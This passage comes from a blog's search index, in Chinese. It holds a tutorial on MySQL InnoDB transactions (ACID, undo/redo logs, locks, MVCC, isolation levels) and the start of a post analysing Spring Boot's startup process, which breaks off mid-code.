tables语句等等。</p><p>不过，常用的select、insert、update和delete命令，都不会强制提交事务。</p><h2 id="3-ACID特性"><a href="#3-ACID特性" class="headerlink" title="3. ACID特性"></a>3. ACID特性</h2><p>ACID是衡量事务的四个特性：</p><ul><li>原子性（Atomicity，或称不可分割性）</li><li>一致性（Consistency）</li><li>隔离性（Isolation）</li><li>持久性（Durability）</li></ul><p>按照严格的标准，只有同时满足ACID特性才是事务；但是在各大数据库厂商的实现中，真正满足ACID的事务少之又少。例如MySQL的NDB Cluster事务不满足持久性和隔离性；InnoDB默认事务隔离级别是可重复读，不满足隔离性；Oracle默认的事务隔离级别为READ COMMITTED，不满足隔离性……因此与其说<strong>ACID</strong>是事务必须满足的条件，不如说它们是衡量事务的四个维度。</p><p>下面将详细介绍ACID特性及其实现原理；为了便于理解，介绍的顺序不是严格按照A-C-I-D。</p><h1 id="二、原子性"><a href="#二、原子性" class="headerlink" title="二、原子性"></a>二、原子性</h1><h2 id="1-定义"><a href="#1-定义" class="headerlink" title="1. 定义"></a>1. 定义</h2><p>原子性是指一个事务是一个不可分割的工作单位，其中的操作要么都做，要么都不做；如果事务中一个sql语句执行失败，则已执行的语句也必须回滚，数据库退回到事务前的状态。</p><h2 id="2-实现原理：undo-log"><a href="#2-实现原理：undo-log" class="headerlink" title="2. 实现原理：undo log"></a>2. 实现原理：undo log</h2><p>在说明原子性原理之前，首先介绍一下MySQL的事务日志。MySQL的日志有很多种，如二进制日志、错误日志、查询日志、慢查询日志等，此外InnoDB存储引擎还提供了两种事务日志：redo log(重做日志)和undo log(回滚日志)。其中redo log用于保证事务持久性；undo log则是事务原子性和隔离性实现的基础。</p><p>下面说回undo log。实现原子性的关键，是当事务回滚时能够撤销所有已经成功执行的sql语句。<strong>InnoDB</strong>实现回滚，靠的是<strong>undo log</strong>：当事务对数据库进行修改时，InnoDB<strong>会生成对应的undo log</strong>；如果事务执行失败或调用了rollback<strong>，导致事务需要回滚，便可以利用</strong>undo log**中的信息将数据回滚到修改之前的样子。</p><p>undo log属于逻辑日志，它记录的是sql执行相关的信息。当发生回滚时，InnoDB会根据undo log的内容做与之前相反的工作：对于每个insert，回滚时会执行delete；对于每个delete，回滚时会执行insert；对于每个update，回滚时会执行一个相反的update，把数据改回去。</p><p>以update操作为例：当事务执行update时，其生成的undo log中会包含被修改行的主键(以便知道修改了哪些行)、修改了哪些列、这些列在修改前后的值等信息，回滚时便可以使用这些信息将数据还原到update之前的状态。</p><h1 id="三、持久性"><a href="#三、持久性" class="headerlink" title="三、持久性"></a>三、持久性</h1><h2 id="1-定义-1"><a href="#1-定义-1" class="headerlink" title="1. 定义"></a>1. 定义</h2><p>持久性是指事务一旦提交，它对数据库的改变就应该是永久性的。接下来的其他操作或故障不应该对其有任何影响。</p><h2 id="2-实现原理：redo-log"><a href="#2-实现原理：redo-log" class="headerlink" title="2. 实现原理：redo log"></a>2. 实现原理：redo log</h2><p>redo log和undo log都属于InnoDB的事务日志。下面先聊一下redo log存在的背景。</p><p>InnoDB作为MySQL的存储引擎，数据是存放在磁盘中的，但如果每次读写数据都需要磁盘IO，效率会很低。为此，InnoDB提供了缓存(Buffer Pool)，Buffer Pool中包含了磁盘中部分数据页的映射，作为访问数据库的缓冲：当从数据库读取数据时，会首先从Buffer Pool中读取，如果Buffer Pool中没有，则从磁盘读取后放入Buffer Pool；当向数据库写入数据时，会首先写入Buffer Pool，Buffer Pool中修改的数据会定期刷新到磁盘中（这一过程称为刷脏）。</p><p>Buffer Pool的使用大大提高了读写数据的效率，但是也带了新的问题：如果MySQL宕机，而此时Buffer Pool中修改的数据还没有刷新到磁盘，就会导致数据的丢失，事务的持久性无法保证。</p><p>于是，redo log被引入来解决这个问题：当数据修改时，除了修改Buffer Pool中的数据，还会在redo log记录这次操作；当事务提交时，会调用fsync接口对redo log进行刷盘。如果MySQL宕机，重启时可以读取redo log中的数据，对数据库进行恢复。redo log采用的是WAL（Write-ahead logging，预写式日志），所有修改先写入日志，再更新到Buffer Pool，保证了数据不会因MySQL宕机而丢失，从而满足了持久性要求。</p><p>既然redo log也需要在事务提交时将日志写入磁盘，为什么它比直接将Buffer Pool中修改的数据写入磁盘(即刷脏)要快呢？主要有以下两方面的原因：</p><p>（1）刷脏是随机IO，因为每次修改的数据位置随机，但写redo log是追加操作，属于顺序IO。</p><p>（2）刷脏是以数据页（Page）为单位的，MySQL默认页大小是16KB，一个Page上一个小修改都要整页写入；而redo log中只包含真正需要写入的部分，无效IO大大减少。</p><h2 id="3-redo-log与binlog"><a href="#3-redo-log与binlog" class="headerlink" title="3. redo log与binlog"></a>3. redo log与binlog</h2><p>我们知道，在MySQL中还存在binlog(二进制日志)也可以记录写操作并用于数据的恢复，但二者是有着根本的不同的：</p><p>（1）作用不同：redo log是用于crash recovery的，保证MySQL宕机也不会影响持久性；binlog是用于point-in-time recovery的，保证服务器可以基于时间点恢复数据，此外binlog还用于主从复制。</p><p>（2）层次不同：redo log是InnoDB存储引擎实现的，而binlog是MySQL的服务器层(可以参考文章前面对MySQL逻辑架构的介绍)实现的，同时支持InnoDB和其他存储引擎。</p><p>（3）内容不同：redo log是物理日志，内容基于磁盘的Page；binlog的内容是二进制的，根据binlog_format参数的不同，可能基于sql语句、基于数据本身或者二者的混合。</p><p>（4）写入时机不同：binlog在事务提交时写入；redo log的写入时机相对多元：</p><ul><li>前面曾提到：当事务提交时会调用fsync对redo log进行刷盘；这是默认情况下的策略，修改innodb_flush_log_at_trx_commit参数可以改变该策略，但事务的持久性将无法保证。</li><li>除了事务提交时，还有其他刷盘时机：如master thread每秒刷盘一次redo log等，这样的好处是不一定要等到commit时刷盘，commit速度大大加快。</li></ul><h1 id="四、隔离性"><a href="#四、隔离性" class="headerlink" title="四、隔离性"></a>四、隔离性</h1><h2 id="1-定义-2"><a href="#1-定义-2" class="headerlink" title="1. 定义"></a>1. 定义</h2><p><strong>与原子性、持久性侧重于研究事务本身不同，隔离性研究的是不同事务之间的相互影响。</strong>隔离性是指，事务内部的操作与其他事务是隔离的，并发执行的各个事务之间不能互相干扰。严格的隔离性，对应了事务隔离级别中的Serializable (可串行化)，但实际应用中出于性能方面的考虑很少会使用可串行化。</p><p>隔离性追求的是并发情形下事务之间互不干扰。简单起见，我们主要考虑最简单的读操作和写操作(加锁读等特殊读操作会特殊说明)，那么隔离性的探讨，主要可以分为两个方面：</p><ul><li>(一个事务)写操作对(另一个事务)写操作的影响：锁机制保证隔离性</li><li>(一个事务)写操作对(另一个事务)读操作的影响：MVCC保证隔离性</li></ul><h2 id="2-锁机制"><a href="#2-锁机制" class="headerlink" title="2. 锁机制"></a>2. 锁机制</h2><p>首先来看两个事务的写操作之间的相互影响。隔离性要求同一时刻只能有一个事务对数据进行写操作，InnoDB通过锁机制来保证这一点。</p><p>锁机制的基本原理可以概括为：事务在修改数据之前，需要先获得相应的锁；获得锁之后，事务便可以修改数据；该事务操作期间，这部分数据是锁定的，其他事务如果需要修改数据，需要等待当前事务提交或回滚后释放锁。</p><p><strong>行锁与表锁</strong></p><p>按照粒度，锁可以分为表锁、行锁以及其他位于二者之间的锁。表锁在操作数据时会锁定整张表，并发性能较差；行锁则只锁定需要操作的数据，并发性能好。但是由于加锁本身需要消耗资源(获得锁、检查锁、释放锁等都需要消耗资源)，因此在锁定数据较多情况下使用表锁可以节省大量资源。MySQL中不同的存储引擎支持的锁是不一样的，例如MyIsam只支持表锁，而InnoDB同时支持表锁和行锁，且出于性能考虑，绝大多数情况下使用的都是行锁。</p><p><strong>如何查看锁信息</strong></p><p>有多种方法可以查看InnoDB中锁的情况，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select&#96; &#96;* &#96;&#96;from&#96; &#96;information_schema.innodb_locks; #锁的概况&#96;&#96;show engine innodb status; #InnoDB整体状态，其中包括锁的情况</span><br></pre></td></tr></table></figure><p>下面来看一个例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#在事务A中执行：&#96;&#96;start &#96;&#96;transaction&#96;&#96;;&#96;&#96;update&#96; &#96;account &#96;&#96;SET&#96; &#96;balance &#x3D; 1000 &#96;&#96;where&#96; &#96;id &#x3D; 1;&#96;&#96;#在事务B中执行：&#96;&#96;start &#96;&#96;transaction&#96;&#96;;&#96;&#96;update&#96; &#96;account &#96;&#96;SET&#96; &#96;balance &#x3D; 2000 &#96;&#96;where&#96; &#96;id &#x3D; 1;</span><br></pre></td></tr></table></figure><p>此时查看锁的情况：</p><p><img src="/img/mysql/mysql3.png" alt="mysql"> </p><p>show engine innodb status查看锁相关的部分：</p><p><img src="/img/mysql/mysql4.png" alt="mysql"> </p><p>通过上述命令可以查看事务24052和24053占用锁的情况；其中lock_type为RECORD，代表锁为行锁(记录锁)；lock_mode为X，代表排它锁(写锁)。</p><p>除了排它锁(写锁)之外，MySQL中还有共享锁(读锁)的概念。由于本文重点是MySQL事务的实现原理，因此对锁的介绍到此为止，后续会专门写文章分析MySQL中不同锁的区别、使用场景等，欢迎关注。</p><p>介绍完写操作之间的相互影响，下面讨论写操作对读操作的影响。</p><h2 id="3-脏读、不可重复读和幻读"><a href="#3-脏读、不可重复读和幻读" class="headerlink" title="3. 脏读、不可重复读和幻读"></a>3. 脏读、不可重复读和幻读</h2><p>首先来看并发情况下，读操作可能存在的三类问题：</p><p>（1）脏读：当前事务(A)中可以读到其他事务(B)未提交的数据（脏数据），这种现象是脏读。举例如下（以账户余额表为例）：</p><p><img src="/img/mysql/mysql5.png" alt="mysql"> </p><p>（2）不可重复读：在事务A中先后两次读取同一个数据，两次读取的结果不一样，这种现象称为不可重复读。脏读与不可重复读的区别在于：前者读到的是其他事务未提交的数据，后者读到的是其他事务已提交的数据。举例如下：</p><p><img src="/img/mysql/mysql6.png" alt="mysql"> </p><p>（3）幻读：在事务A中按照某个条件先后两次查询数据库，两次查询结果的条数不同，这种现象称为幻读。不可重复读与幻读的区别可以通俗的理解为：前者是数据变了，后者是数据的行数变了。举例如下：</p><p><img src="/img/mysql/mysql7.png" alt="mysql"> </p><h2 id="4-事务隔离级别"><a href="#4-事务隔离级别" class="headerlink" title="4. 事务隔离级别"></a>4. 事务隔离级别</h2><p>SQL标准中定义了四种隔离级别，并规定了每种隔离级别下上述几个问题是否存在。一般来说，隔离级别越低，系统开销越低，可支持的并发越高，但隔离性也越差。隔离级别与读问题的关系如下：</p><p><img src="/img/mysql/mysql8.png" alt="mysql"> </p><p>在实际应用中，<strong>读未提交</strong>在并发时会导致很多问题，而性能相对于其他隔离级别提高却很有限，因此使用较少。<strong>可串行化</strong>强制事务串行，并发效率很低，只有当对数据一致性要求极高且可以接受没有并发时使用，因此使用也较少。因此在大多数数据库系统中，默认的隔离级别是<strong>读已提交**</strong>(<strong>**如Oracle)</strong>或<strong>可重复读（后文简称**</strong>RR<strong>**）</strong>。</p><p>可以通过如下两个命令分别查看全局隔离级别和本次会话的隔离级别：</p><p><img src="/img/mysql/mysql9.png" alt="mysql"> </p><p><img src="/img/mysql/mysql10.png" alt="mysql"> </p><p>InnoDB默认的隔离级别是RR，后文会重点介绍RR。需要注意的是，在SQL标准中，RR是无法避免幻读问题的；但是InnoDB实现的RR，在只读事务中可以避免幻读问题。</p><h2 id="5-MVCC"><a href="#5-MVCC" class="headerlink" title="5. MVCC"></a>5. MVCC</h2><p>RR解决脏读、不可重复读、幻读等问题，使用的是MVCC：MVCC全称Multi-Version Concurrency Control，即多版本的并发控制协议。下面的例子很好的体现了MVCC的特点：在同一时刻，不同的事务读取到的数据可能是不同的(即多版本)——在T5时刻，事务A和事务C可以读取到不同版本的数据。</p><p><img src="/img/mysql/mysql11.png" alt="mysql"> </p><p>MVCC最大的优点是读不加锁，因此读写不冲突，并发性能好。InnoDB实现MVCC，多个版本的数据可以共存，主要基于以下技术及数据结构：</p><p>1）隐藏列：InnoDB中每行数据都有隐藏列，隐藏列中包含了本行数据的事务id、指向undo log的指针等。</p><p>2）基于undo log的版本链：前面说到每行数据的隐藏列中包含了指向undo log的指针，而每条undo log也会指向更早版本的undo log，从而形成一条版本链。</p><p>3）ReadView：通过隐藏列和版本链，MySQL可以将数据恢复到指定版本；但是具体要恢复到哪个版本，则需要根据ReadView来确定。所谓ReadView，是指事务（记做事务A）在某一时刻给整个事务系统（trx_sys）打快照，之后再进行读操作时，会将读取到的数据中的事务id与trx_sys快照比较，从而判断数据对该ReadView是否可见，即对事务A是否可见。</p><p>trx_sys中的主要内容，以及判断可见性的方法如下：</p><ul><li>low_limit_id：表示生成ReadView时系统中应该分配给下一个事务的id。如果数据的事务id大于等于low_limit_id，则对该ReadView不可见。</li><li>up_limit_id：表示生成ReadView时当前系统中活跃的读写事务中最小的事务id。如果数据的事务id小于up_limit_id，则对该ReadView可见。</li><li>rw_trx_ids：表示生成ReadView时当前系统中活跃的读写事务的事务id列表。如果数据的事务id在low_limit_id和up_limit_id之间，则需要判断事务id是否在rw_trx_ids中：如果在，说明生成ReadView时事务仍在活跃中，因此数据对ReadView不可见；如果不在，说明生成ReadView时事务已经提交了，因此数据对ReadView可见。</li></ul><p>下面以RR隔离级别为例，结合前文提到的几个问题分别说明。</p><p>（1）脏读</p><p><img src="/img/mysql/mysql12.png" alt="mysql"> </p><p>当事务A在T3时刻读取zhangsan的余额前，会生成ReadView，由于此时事务B没有提交仍然活跃，因此其事务id一定在ReadView的rw_trx_ids中，因此根据前面介绍的规则，事务B的修改对ReadView不可见。接下来，事务A根据指针指向的undo log查询上一版本的数据，得到zhangsan的余额为100。这样事务A就避免了脏读。</p><p>（2）不可重复读</p><p><img src="/img/mysql/mysql13.png" alt="mysql"> </p><p>当事务A在T2时刻读取zhangsan的余额前，会生成ReadView。此时事务B分两种情况讨论，一种是如图中所示，事务已经开始但没有提交，此时其事务id在ReadView的rw_trx_ids中；一种是事务B还没有开始，此时其事务id大于等于ReadView的low_limit_id。无论是哪种情况，根据前面介绍的规则，事务B的修改对ReadView都不可见。</p><p>当事务A在T5时刻再次读取zhangsan的余额时，会根据T2时刻生成的ReadView对数据的可见性进行判断，从而判断出事务B的修改不可见；因此事务A根据指针指向的undo log查询上一版本的数据，得到zhangsan的余额为100，从而避免了不可重复读。</p><p>（3）幻读</p><p><img src="/img/mysql/mysql14.png" alt="mysql"> </p><p>MVCC避免幻读的机制与避免不可重复读非常类似。</p><p>当事务A在T2时刻读取0&lt;id&lt;5的用户余额前，会生成ReadView。此时事务B分两种情况讨论，一种是如图中所示，事务已经开始但没有提交，此时其事务id在ReadView的rw_trx_ids中；一种是事务B还没有开始，此时其事务id大于等于ReadView的low_limit_id。无论是哪种情况，根据前面介绍的规则，事务B的修改对ReadView都不可见。</p><p>当事务A在T5时刻再次读取0&lt;id&lt;5的用户余额时，会根据T2时刻生成的ReadView对数据的可见性进行判断，从而判断出事务B的修改不可见。因此对于新插入的数据lisi(id=2)，事务A根据其指针指向的undo log查询上一版本的数据，发现该数据并不存在，从而避免了幻读。</p><p><strong>扩展</strong></p><p>前面介绍的MVCC，是RR隔离级别下“非加锁读”实现隔离性的方式。下面是一些简单的扩展。</p><p>（1）读已提交（RC）隔离级别下的非加锁读</p><p>RC与RR一样，都使用了MVCC，其主要区别在于：</p><p>RR是在事务开始后第一次执行select前创建ReadView，直到事务提交都不会再创建。根据前面的介绍，RR可以避免脏读、不可重复读和幻读。</p><p>RC每次执行select前都会重新建立一个新的ReadView，因此如果事务A第一次select之后，事务B对数据进行了修改并提交，那么事务A第二次select时会重新建立新的ReadView，因此事务B的修改对事务A是可见的。因此RC隔离级别可以避免脏读，但是无法避免不可重复读和幻读。</p><p>（2）加锁读与next-key lock</p><p>按照是否加锁，MySQL的读可以分为两种：</p><p>一种是非加锁读，也称作快照读、一致性读，使用普通的select语句，这种情况下使用MVCC避免了脏读、不可重复读、幻读，保证了隔离性。</p><p>另一种是加锁读，查询语句有所不同，如下所示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#共享锁读取&#96;&#96;select&#96;&#96;...lock &#96;&#96;in&#96; &#96;share mode&#96;&#96;#排它锁读取&#96;&#96;select&#96;&#96;...&#96;&#96;for&#96; &#96;update</span><br></pre></td></tr></table></figure><p>加锁读在查询时会对查询的数据加锁（共享锁或排它锁）。由于锁的特性，当某事务对数据进行加锁读后，其他事务无法对数据进行写操作，因此可以避免脏读和不可重复读。而避免幻读，则需要通过next-key lock。<strong>next-key lock**</strong>是行锁的一种，实现相当于<strong><strong>record lock(</strong></strong>记录锁<strong><strong>) + gap lock(</strong></strong>间隙锁<strong><strong>)</strong></strong>；其特点是不仅会锁住记录本身<strong><strong>(record lock</strong></strong>的功能<strong><strong>)</strong></strong>，还会锁定一个范围<strong><strong>(gap lock</strong></strong>的功能<strong><strong>)</strong></strong>。**因此，加锁读同样可以避免脏读、不可重复读和幻读，保证隔离性。</p><h2 id="6-总结"><a href="#6-总结" class="headerlink" title="6. 总结"></a>6. 总结</h2><p>概括来说，InnoDB实现的RR，通过锁机制（包含next-key lock）、MVCC（包括数据的隐藏列、基于undo log的版本链、ReadView）等，实现了一定程度的隔离性，可以满足大多数场景的需要。</p><p>不过需要说明的是，RR虽然在只读事务中避免了幻读问题，但是毕竟不是Serializable，不能保证完全的隔离，下面是两个例子：</p><p>第一个例子，如果在事务中第一次读取采用非加锁读，第二次读取采用加锁读，则如果在两次读取之间数据发生了变化，两次读取到的结果不一样，因为加锁读时不会采用MVCC。</p><p>第二个例子，如下所示，大家可以自己验证一下。</p><p><img src="/img/mysql/mysql15.png" alt="mysql"> </p><h1 id="五、一致性"><a href="#五、一致性" class="headerlink" title="五、一致性"></a>五、一致性</h1><h2 id="1-基本概念"><a href="#1-基本概念" class="headerlink" title="1. 基本概念"></a>1. 基本概念</h2><p>一致性是指事务执行结束后，<strong>数据库的完整性约束没有被破坏，事务执行的前后都是合法的数据状态。</strong>数据库的完整性约束包括但不限于：实体完整性（如行的主键存在且唯一）、列完整性（如字段的类型、大小、长度要符合要求）、外键约束、用户自定义完整性（如转账前后，两个账户余额的和应该不变）。</p><h2 id="2-实现"><a href="#2-实现" class="headerlink" title="2. 实现"></a>2. 实现</h2><p>可以说，一致性是事务追求的最终目标：前面提到的原子性、持久性和隔离性，都是为了保证数据库状态的一致性。此外，除了数据库层面的保障，一致性的实现也需要应用层面进行保障。</p><p>实现一致性的措施包括：</p><ul><li>保证原子性、持久性和隔离性，如果这些特性无法保证，事务的一致性也无法保证</li><li>数据库本身提供保障，例如不允许向整形列插入字符串值、字符串长度不能超过列的限制等</li><li>应用层面进行保障，例如如果转账操作只扣除转账者的余额，而没有增加接收者的余额，无论数据库实现的多么完美，也无法保证状态的一致</li></ul><h1 id="六、总结"><a href="#六、总结" class="headerlink" title="六、总结"></a>六、总结</h1><p>下面总结一下ACID特性及其实现原理：</p><ul><li>原子性：语句要么全执行，要么全不执行，是事务最核心的特性，事务本身就是以原子性来定义的；实现主要基于undo log</li><li>持久性：保证事务提交后不会因为宕机等原因导致数据丢失；实现主要基于redo log</li><li>隔离性：保证事务执行尽可能不受其他事务影响；InnoDB默认的隔离级别是RR，RR的实现主要基于锁机制（包含next-key lock）、MVCC（包括数据的隐藏列、基于undo log的版本链、ReadView）</li><li>一致性：事务追求的最终目标，一致性的实现既需要数据库层面的保障，也需要应用层面的保障</li></ul><h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p>《MySQL技术内幕：InnoDB存储引擎》</p><p>《高性能MySQL》</p><p>《MySQL运维内参》</p><p><a href="https://dev.mysql.com/doc/refman/5.6/en/glossary.html#glos_acid" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/5.6/en/glossary.html#glos_acid</a></p><p><a href="https://dev.mysql.com/doc/refman/5.6/en/innodb-next-key-locking.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/5.6/en/innodb-next-key-locking.html</a></p><p><a href="http://blog.sina.com.cn/s/blog_499740cb0100ugs7.html" target="_blank" rel="noopener">http://blog.sina.com.cn/s/blog_499740cb0100ugs7.html</a></p><p><a href="https://mp.weixin.qq.com/s/2dwGBTmu_da2x-HiHlN0vw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/2dwGBTmu_da2x-HiHlN0vw</a></p><p><a href="http://www.cnblogs.com/chenpingzhao/p/5065316.html" target="_blank" rel="noopener">http://www.cnblogs.com/chenpingzhao/p/5065316.html</a></p><p><a href="https://juejin.im/entry/5ba0a254e51d450e735e4a1f" target="_blank" rel="noopener">https://juejin.im/entry/5ba0a254e51d450e735e4a1f</a></p><p><a href="http://hedengcheng.com/?p=771" target="_blank" rel="noopener">http://hedengcheng.com/?p=771</a></p><p><a href="http://mysql.taobao.org/monthly/2018/03/01/" target="_blank" rel="noopener">http://mysql.taobao.org/monthly/2018/03/01/</a></p><p><a href="https://blog.csdn.net/nmjhehe/article/details/98470570" target="_blank" rel="noopener">https://blog.csdn.net/nmjhehe/article/details/98470570</a></p><p><a href="https://elsef.com/2019/03/10/MySQL%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3%E5%90%84%E7%A7%8D%E4%B8%8D%E6%AD%A3%E5%B8%B8%E8%AF%BB/" target="_blank" rel="noopener">https://elsef.com/2019/03/10/MySQL%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3%E5%90%84%E7%A7%8D%E4%B8%8D%E6%AD%A3%E5%B8%B8%E8%AF%BB/</a></p><p><a href="https://www.zhihu.com/question/372905832" target="_blank" rel="noopener">https://www.zhihu.com/question/372905832</a></p>]]></content>
      
      
      <categories>
          
          <category> MySQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>springboot启动流程分析</title>
      <link href="/2024/01/12/springboot%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/"/>
      <url>/2024/01/12/springboot%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="spring-boot启动概述"><a href="#spring-boot启动概述" class="headerlink" title="spring boot启动概述"></a>spring boot启动概述</h2><p>spring boot 框架凭借极简配置，一键运行和强大的第三方框架集成等特点，受到广大开发者的青睐，基本成为java开发中必不可少的基础的框架。spirng boot带给我们这么多便利的背后，它都做了些什么，让我们就跟随spirng boot的整个启动流程一探究竟。</p><p><img src="/img/springboot/boot0.png" alt="springboot"> </p><p>上图可见spring boot的整个启动流程及各组件的相互调用关系。</p><ol><li>java程序由启动主类调用main()方法开始。</li><li>调用 SpringApplication的构造方法，实例一个Spirng应用对象。在构造方法里主要完成启动环境初始化工作，如，推断主类，spring应用类型，加载配置文件，读取spring.factories文件等。</li><li>调用run方法，所有的启动工作在该方法内完成，主要完成加载配置资源，准备上下文，创建上下文，刷新上下文，过程事件发布等。<br> 整个启动流程细节我们跟着源码分析。</li></ol><h2 id="1-启动入口-（SrpingApplication）"><a href="#1-启动入口-（SrpingApplication）" class="headerlink" title="1.启动入口 （SrpingApplication）"></a>1.启动入口 （SrpingApplication）</h2><p>大家熟悉的springboot的启动类，@SpringBootApplication + psvm（main方法）+ new SpringApplication().run(XXXX.class, args)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">java 代码解读复制代码<span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SummaryApplication</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SpringApplication application = <span class="keyword">new</span> SpringApplication(); <span class="comment">// 2</span></span><br><span class="line">        application.run(SummaryApplication<span class="class">.<span class="keyword">class</span>, <span class="title">args</span>)</span>; <span class="comment">//3</span></span><br><span class="line"><span class="comment">//      SpringApplication.run(SummaryApplication.class, args);  也可简化调用静态方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1-1-SpringBootApplication-注解"><a href="#1-1-SpringBootApplication-注解" class="headerlink" title="1.1 @SpringBootApplication 注解"></a>1.1 @SpringBootApplication 注解</h3><p>通过源码发现该注解只是@Configuration，@EnableAutoConfiguration，@ComponentScan 三个注解的组合，这是在springboot 1.5以后为这三个注解做的一个简写。接下来简单说下这三个注解的功能：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">java 代码解读复制代码<span class="meta">@Target</span>(ElementType.TYPE)</span><br><span class="line"><span class="meta">@Retention</span>(RetentionPolicy.RUNTIME)</span><br><span class="line"><span class="meta">@Documented</span></span><br><span class="line"><span class="meta">@Inherited</span></span><br><span class="line"><span class="meta">@SpringBootConfiguration</span> <span class="comment">//1.1.1 注册为配置类</span></span><br><span class="line"><span class="meta">@EnableAutoConfiguration</span> <span class="comment">//1.1.2 配置可自动装配</span></span><br><span class="line"><span class="meta">@ComponentScan</span>(excludeFilters = &#123; <span class="comment">//1.1.3 声明可扫描Bean </span></span><br><span class="line">  <span class="meta">@Filter</span>(type = FilterType.CUSTOM, classes = TypeExcludeFilter<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line"><span class="class">  @<span class="title">Filter</span>(<span class="title">type</span> </span>= FilterType.CUSTOM, classes = AutoConfigurationExcludeFilter<span class="class">.<span class="keyword">class</span>) &#125;)</span></span><br><span class="line"><span class="class"><span class="title">public</span> @<span class="title">interface</span> <span class="title">SpringBootApplication</span> </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="1-1-1-SpringBootConfiguration"><a href="#1-1-1-SpringBootConfiguration" class="headerlink" title="1.1.1 @SpringBootConfiguration"></a>1.1.1 @SpringBootConfiguration</h4><p>该注解就是spirng ioc容器中java config 配置方式的@Configuration ，注册当前类为spring ioc容器的配置类。</p><p>搭配@bean注解创建一个简单spring ioc配置类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">java 代码解读复制代码 <span class="meta">@Configuration</span>    </span><br><span class="line"> <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Conf</span> </span>&#123;   </span><br><span class="line">   <span class="meta">@Bean</span>  </span><br><span class="line">   <span class="function"><span class="keyword">public</span> Car <span class="title">car</span><span class="params">()</span> </span>&#123;     </span><br><span class="line">       Car car = <span class="keyword">new</span> Car();   </span><br><span class="line">       car.setWheel(wheel());     </span><br><span class="line">       <span class="keyword">return</span> car;    </span><br><span class="line">   &#125;  </span><br><span class="line">   <span class="meta">@Bean</span>  </span><br><span class="line">   <span class="function"><span class="keyword">public</span> Wheel <span class="title">wheel</span><span class="params">()</span> </span>&#123;     </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Wheel();   </span><br><span class="line">   &#125;  </span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h4 id="1-1-2-EnableAutoConfiguration"><a href="#1-1-2-EnableAutoConfiguration" class="headerlink" title="1.1.2 @EnableAutoConfiguration"></a>1.1.2 @EnableAutoConfiguration</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">java 代码解读复制代码<span class="meta">@Target</span>(ElementType.TYPE)</span><br><span class="line"><span class="meta">@Retention</span>(RetentionPolicy.RUNTIME)</span><br><span class="line"><span class="meta">@Documented</span></span><br><span class="line"><span class="meta">@Inherited</span></span><br><span class="line"><span class="meta">@AutoConfigurationPackage</span></span><br><span class="line"><span class="meta">@Import</span>(AutoConfigurationImportSelector<span class="class">.<span class="keyword">class</span>) //最为重要</span></span><br><span class="line"><span class="class"><span class="title">public</span> @<span class="title">interface</span> <span class="title">EnableAutoConfiguration</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">   String ENABLED_OVERRIDE_PROPERTY = <span class="string">"spring.boot.enableautoconfiguration"</span>;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * Exclude specific auto-configuration classes such that they will never be applied.</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return</span> the classes to exclude</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   Class&lt;?&gt;[] exclude() <span 